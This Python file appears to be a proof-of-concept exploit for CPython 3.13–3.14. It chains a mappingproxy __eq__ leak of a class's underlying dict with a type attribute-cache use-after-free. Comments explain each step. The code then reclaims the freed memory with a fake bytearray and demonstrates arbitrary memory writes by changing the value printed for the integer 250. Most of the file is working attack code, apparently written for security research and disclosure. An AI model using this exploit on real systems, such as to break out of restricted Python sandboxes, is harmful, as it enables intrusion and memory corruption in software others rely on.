"""
Author: @Nico-Posada
Bug Credits: <https://bugs.python.org/issue43838>
"""

# TLDR: Get underlying dict of a mappingproxy object to exploit attribute cache UAF 
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Very old and well known bug that python devs have already confirmed won't be patched
# for whatever reason (https://bugs.python.org/issue43838#msg399022).

# This is a mix of 2 bugs, the first one is being able to access the underlying dict of a mappingproxy.
# This bug is pretty simple, in the mappingproxy `__eq__` implementation, it just grabs the underlying dict then calls richcompare with that.
# https://github.com/python/cpython/blob/v3.14.0/Objects/descrobject.c#L1232-L1237
"""
static PyObject *
mappingproxy_richcompare(PyObject *self, PyObject *w, int op)
{
    mappingproxyobject *v = (mappingproxyobject *)self;
    return PyObject_RichCompare(v->mapping, w, op); // <--- v->mapping is the underlying dict
}
"""
# First it'll call mapping.__eq__(w) which will return NotImplemented, then it'll call w.__eq__(mapping)
# which is the func we control. We can grab the dict object in there.

# Once you have the underlying dict of a mappingproxy, you can modify it however you
# want and perform the second bug, the attribute cache UAF.

# The attribute cache will not get invalidated if you delete an object via the class dict, so you can add the object to the cache,
# free the object by deleting it from the dict, then grab it out of the cache. (least contrived python exploit)

# NOTE: this also works with the __ror__ function for the exact same reason as explained above.

from common import evil_bytearray_obj

class bytes_subclass(bytes):
    pass

# see ./common/common.py for evil bytearray obj explanation
fake_obj, _ = evil_bytearray_obj()

SIZE = 0x100
class evil:
    mem = bytes_subclass(SIZE - 0x18)
    def __eq__(self, other):
        self.mem         # add mem to the attribute cache
        del other['mem'] # delete mem, but it still exists in the attr cache

# trigger bug
evil.__dict__ == evil()
# can use this too
# vars(evil) == evil()

# reclaim memory we deleted with data for our fake obj
_ref = fake_obj.ljust(SIZE, b"\0")

# grab the value from the attribute cache (now our evil bytearray object)
mem = evil.mem

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100